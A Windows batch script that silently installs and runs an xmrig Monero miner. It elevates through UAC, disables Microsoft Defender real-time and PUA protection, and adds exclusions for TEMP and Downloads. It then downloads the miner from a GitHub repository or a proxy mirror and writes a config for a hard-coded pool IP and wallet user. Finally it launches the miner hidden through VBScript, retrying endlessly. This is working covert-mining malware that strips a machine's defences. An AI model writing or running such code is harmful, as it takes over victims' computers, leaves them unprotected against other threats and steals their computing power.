@echo off
rem Pull xmrig-6.26.0-windows-x64.zip (0-fee build) from GitHub, raise UAC,
rem turn off the Defender blocks, unpack into %TEMP%\XMR_<timestamp> and start.
rem
rem Elevation pays twice here: it is what lets the Defender settings land, and
rem it is what lets xmrig grab huge pages (+20-30% hashrate on RandomX).
rem Elevation is therefore mandatory, not best-effort -- the guard below aborts
rem rather than start a miner that cannot get huge pages.
rem
rem Thread count is left to xmrig: it sizes the worker pool to the CPU's L3
rem cache (2 MB scratchpad per thread), which beats any fixed number.
rem
rem Silent apart from the UAC prompt itself -- that one is a system dialog.
setlocal enabledelayedexpansion

rem Exactly one UAC prompt, never two.  The elevation attempt relaunches us
rem with the "elev" marker; if we come back still without the administrator
rem token the prompt was refused, so report it instead of asking again.
if "%~1"=="elev" (
    net session >nul 2>&1
    if errorlevel 1 call :FAIL "Elevation was refused." "Click Yes on the UAC prompt and run this again."
)

net session >nul 2>&1
if errorlevel 1 (
    powershell -NoProfile -Command "Start-Process -FilePath '%~f0' -ArgumentList 'elev' -Verb RunAs -WindowStyle Hidden"
    exit /b 0
)

if "%~1"=="hidden" goto :main

rem mshta's VBScript engine is gone on Win11 24H2+, wscript is not.
> "%TEMP%\_xmr_hide.vbs" echo CreateObject("WScript.Shell").Run "cmd /c ""%~f0"" hidden", 0, False
wscript.exe //nologo "%TEMP%\_xmr_hide.vbs"
del /q "%TEMP%\_xmr_hide.vbs" 2>nul
exit /b 0

:main
rem Every path into :main already passed the net session check, but re-check:
rem a miner started without the administrator token silently loses huge pages.
net session >nul 2>&1
if errorlevel 1 call :FAIL "Not running as administrator." "xmrig needs the administrator token for huge pages. Right click the script and pick Run as administrator."

set "NAME=xmrig-6.26.0-windows-x64.zip"
set "RAW=https://github.com/acu715/acu715/raw/refs/heads/main/Mining/XMR_Rig_6.26.0_0dev"
set "ZIP_SHA=afb2a986381804b9c0157b083685af834e46ae40bc3082eefa21bdb07819b535"
set "EXE_SHA=812d85f7b829b77ee70092cfe319b42ae049304e35b3f6c490fda3d7e7b13d92"
set "DVLOG=%TEMP%\_xmr_defender.log"
set "DL=%TEMP%\_xmr_dl"

rem ------------------------------------------------------- what is guarding us --
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$l='%DVLOG%'" ^
  "; ('--- ' + (Get-Date).ToString('s')) | Out-File $l -Encoding utf8" ^
  "; try { Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -EA Stop | ForEach-Object { ('AV: ' + $_.displayName) | Out-File $l -Append -Encoding utf8 } } catch { 'AV: (query failed)' | Out-File $l -Append -Encoding utf8 }" ^
  "; try { $s = Get-MpComputerStatus -EA Stop; ('tamper=' + $s.IsTamperProtected + '  rtp=' + $s.RealTimeProtectionEnabled) | Out-File $l -Append -Encoding utf8 } catch { 'tamper: (query failed)' | Out-File $l -Append -Encoding utf8 }"

rem ---------------------------------------------------------------- Defender --
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$ErrorActionPreference='SilentlyContinue'" ^
  "; Set-MpPreference -PUAProtection Disabled" ^
  "; $dl = $env:USERPROFILE + '\Downloads'" ^
  "; foreach ($p in @($env:TEMP, $dl, '%DL%')) { Add-MpPreference -ExclusionPath $p }" ^
  "; Set-MpPreference -DisableRealtimeMonitoring $true" ^
  "; exit 0"

rem Ask what is *running*, not what the settings say.  Get-MpPreference returns
rem an empty object on machines where Defender is disabled at the service or
rem policy level, so comparing its fields reports a false failure even when
rem protection is already off.  Real-time protection being down, or a working
rem TEMP exclusion, is enough for the unpack to survive.
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$l='%DVLOG%'" ^
  "; $rtpOn = $null" ^
  "; try { $rtpOn = (Get-MpComputerStatus).RealTimeProtectionEnabled } catch {}" ^
  "; $ex = @()" ^
  "; try { $ex = @((Get-MpPreference).ExclusionPath) } catch {}" ^
  "; $hasTemp = $false" ^
  "; foreach ($e in $ex) { if ($e -eq $env:TEMP) { $hasTemp = $true } }" ^
  "; ('after: realTimeOn=' + $rtpOn + '  tempExcluded=' + $hasTemp + '  exclusions=' + ($ex -join '; ')) | Out-File $l -Append -Encoding utf8" ^
  "; if ($rtpOn -eq $false -or $hasTemp) { exit 0 } else { exit 3 }"
if errorlevel 3 call :FAIL "The antivirus settings did not take effect." "Open _xmr_defender.log in %TEMP% -- it lists what is guarding this machine. Tamper Protection is on: turn it off in Windows Security > Virus & threat protection > Manage settings, then run again."

rem ---------------------------------------------------------------- fetch loop --
rem github.com first, mirror only if the direct route is blocked.
rem
rem Everything from here down to the launch runs in an endless retry loop.  A
rem flaky mirror, a truncated transfer, or antivirus eating the unpacked exe
rem are all transient; this installer is silent, so a dialog box would mean
rem the operator has to notice it and come back to start over.  Retrying costs
rem a few seconds and no attention.  Each round logs why the previous one
rem failed into _xmr_defender.log, and waits five seconds before trying again
rem so a hard failure cannot spin the CPU.
set "TRY=0"
if not exist "%DL%" mkdir "%DL%"
set "ZIP=%DL%\%NAME%"

:RETRY
set /a TRY+=1

rem Wipe last round's leavings: a half-written zip, and any unpack folder.
rem A folder holding a running exe refuses to delete and is skipped, harmless.
del /q "%ZIP%" 2>nul
for /d %%d in ("%TEMP%\XMR_*") do rd /s /q "%%d" 2>nul

set "GOT=0"
call :FETCH "%RAW%/%NAME%" direct 0
if "!GOT!"=="1" goto :GOT_ZIP
call :FETCH "https://gh-proxy.com/%RAW%/%NAME%" mirror 2
if "!GOT!"=="1" goto :GOT_ZIP
call :RETRY_WAIT "download failed (direct and mirror)"

:GOT_ZIP
call :CHECK_HASH "%ZIP%" "%ZIP_SHA%"
if not "!HASH_OK!"=="1" call :RETRY_WAIT "zip sha256 mismatch"

set "TS="
for /f "usebackq delims=" %%i in (`powershell -NoProfile -Command "Get-Date -Format yyyyMMdd_HHmmss"`) do set "TS=%%i"
if not defined TS set "TS=run"
set "DIR=%TEMP%\XMR_%TS%"
set "EXE=%DIR%\xmrig-6.26.0\xmrig.exe"
set "CFG=%DIR%\xmrig-6.26.0\config.json"

mkdir "%DIR%" 2>nul
copy /y "%ZIP%" "%DIR%\%NAME%" >nul
if not exist "%DIR%\%NAME%" call :RETRY_WAIT "cannot copy the zip into TEMP"

powershell -NoProfile -ExecutionPolicy Bypass -Command "Expand-Archive -LiteralPath '%DIR%\%NAME%' -DestinationPath '%DIR%' -Force" 2>nul
if not exist "%EXE%" call :RETRY_WAIT "xmrig.exe missing after unpack (antivirus?)"

call :CHECK_HASH "%EXE%" "%EXE_SHA%"
if not "!HASH_OK!"=="1" call :RETRY_WAIT "xmrig.exe sha256 mismatch, !EXE_SIZE! bytes"

rem Both hashes verified -- this round produced a clean miner, fall through.

rem max-threads-hint 100 is xmrig's default (RxConfig::threads returns every
rem logical core when limit >= 100) -- written out so the config says so
rem instead of leaving a reader guessing whether the field was forgotten.
rem log-file uses forward slashes so the JSON needs no escaping; Windows
rem accepts them.
> "%CFG%" echo {
>> "%CFG%" echo     "autosave": false,
>> "%CFG%" echo     "background": true,
>> "%CFG%" echo     "cpu": {
>> "%CFG%" echo         "huge-pages": true,
>> "%CFG%" echo         "max-threads-hint": 100
>> "%CFG%" echo     },
>> "%CFG%" echo     "log-file": "%DIR:\=/%/xmrig-6.26.0/xmrig.log",
>> "%CFG%" echo     "donate-level": 0,
>> "%CFG%" echo     "pools": [
>> "%CFG%" echo         {
>> "%CFG%" echo             "url": "58.176.17.24:3334",
>> "%CFG%" echo             "user": "krxYN6EMJQ.XMR_Proxy",
>> "%CFG%" echo             "pass": "x",
>> "%CFG%" echo             "tls": true,
>> "%CFG%" echo             "keepalive": true
>> "%CFG%" echo         },
>> "%CFG%" echo         {
>> "%CFG%" echo             "url": "58.176.17.24:3333",
>> "%CFG%" echo             "user": "krxYN6EMJQ.XMR_Proxy",
>> "%CFG%" echo             "pass": "x",
>> "%CFG%" echo             "tls": false,
>> "%CFG%" echo             "keepalive": true
>> "%CFG%" echo         }
>> "%CFG%" echo     ]
>> "%CFG%" echo }

> "%TEMP%\_xmr_run.vbs" echo CreateObject("WScript.Shell").Run """%EXE%""", 0, False
wscript.exe //nologo "%TEMP%\_xmr_run.vbs"
del /q "%TEMP%\_xmr_run.vbs" 2>nul
exit /b 0

rem Log the reason, pause, and start the round over.  Never returns: every
rem caller is a failure path that wants a fresh attempt.
:RETRY_WAIT
>> "%DVLOG%" echo retry !TRY!: %~1
ping -n 6 127.0.0.1 >nul
goto :RETRY

rem certutil prints a header line, the hex digest, then a trailer.  findstr
rem matches the trailer too ("CertUtil:" starts with a hex letter), so take
rem the FIRST match, never the last.
:CHECK_HASH
set "HASH_OK=0"
set "HASH_ACTUAL="
set "EXE_SIZE=0"
if exist "%~1" for %%Z in ("%~1") do set "EXE_SIZE=%%~zZ"
if not exist "%~1" exit /b 1
for /f "delims=" %%H in ('certutil -hashfile "%~1" SHA256 ^| findstr /r /i "^[0-9a-f]"') do (
    if not defined HASH_ACTUAL set "HASH_ACTUAL=%%H"
)
if not defined HASH_ACTUAL set "HASH_ACTUAL=(no digest)"
set "HASH_ACTUAL=!HASH_ACTUAL: =!"
if /i "!HASH_ACTUAL!"=="%~2" set "HASH_OK=1"
exit /b 0

rem retries = %~3: direct tries once, the mirror three times.
:FETCH
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue'; $ok=$false; for($i=0;$i -le %~3;$i++){ try { Invoke-WebRequest -Uri '%~1' -OutFile '%ZIP%' -TimeoutSec 90 -UseBasicParsing; $ok=$true; break } catch { Start-Sleep 3 } }; if(-not $ok){ exit 1 }"
if errorlevel 1 (
    del /q "%ZIP%" 2>nul
    exit /b 0
)
set "GOT=1"
exit /b 0

rem No console to print to, so the reason arrives as a dialog box.
:FAIL
> "%TEMP%\_xmr_fail.vbs" echo MsgBox "%~1" ^& vbCrLf ^& vbCrLf ^& "%~2", 16, "XMR Rig"
wscript.exe //nologo "%TEMP%\_xmr_fail.vbs"
del /q "%TEMP%\_xmr_fail.vbs" 2>nul
exit /b 1
